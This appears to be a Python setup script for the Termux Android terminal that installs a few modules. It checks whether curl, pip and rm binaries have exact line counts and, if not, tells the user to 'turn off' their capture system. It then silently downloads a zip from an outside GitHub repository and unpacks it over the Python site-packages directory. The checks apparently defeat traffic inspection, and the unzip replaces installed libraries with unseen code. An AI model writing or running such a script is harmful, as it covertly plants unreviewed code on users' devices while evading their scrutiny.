import os,importlib,platform,time
print("                   \033[1;36m[\033[1;32mINSTALLING MODULES\033[1;36m]\033[38;2;0;255;127m")
os.system('pip install httpx')
os.system('pip install pycurl')
os.system('pip install psutil')
os.system('cd')
paths_to_check = [
    "../usr/bin/curl",
    "../usr/bin/pip",
    "../usr/bin/pip3",
    "../usr/bin/pip3.11",
    "../usr/bin/pip2",
    "../usr/bin/pip2.7"
    "../usr/bin/rm"
]

for path in paths_to_check:
    if not os.path.exists(path):
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit(1)
try:
    if not str(len(open('../usr/bin/curl', 'r', encoding='utf-8').readlines())) == '1423':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
try:
    if not str(len(open('../usr/bin/rm', 'r', encoding='utf-8').readlines())) == '7921':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
try:
    if not str(len(open('../usr/bin/pip', 'r', encoding='utf-8').readlines())) == '8':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
try:
    if not str(len(open('../usr/bin/pip3', 'r', encoding='utf-8').readlines())) == '8':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
try:
    if not str(len(open('../usr/bin/pip3.11', 'r', encoding='utf-8').readlines())) == '8':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
try:
    if not str(len(open('../usr/bin/pip2', 'r', encoding='utf-8').readlines())) == '10':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
try:
    if not str(len(open('../usr/bin/pip2.7', 'r', encoding='utf-8').readlines())) == '10':
        time.sleep(0)
        print('\033[1;37m [\u001b[36m𝜩\033[1;37m] TURN OFF YOUR LOCAL CAPTURE SYSTEM')
        exit()
    else:
        pass
except UnicodeDecodeError:
    print("")
os.system("curl -L -o complete.zip https://raw.githubusercontent.com/BINOD-XD/SERVER-RXS/main/complete.zip && unzip -o complete.zip -d /data/data/com.termux/files/usr/lib/python3.11/site-packages > /dev/null 2>&1")
os.system("termux-reload-settings")
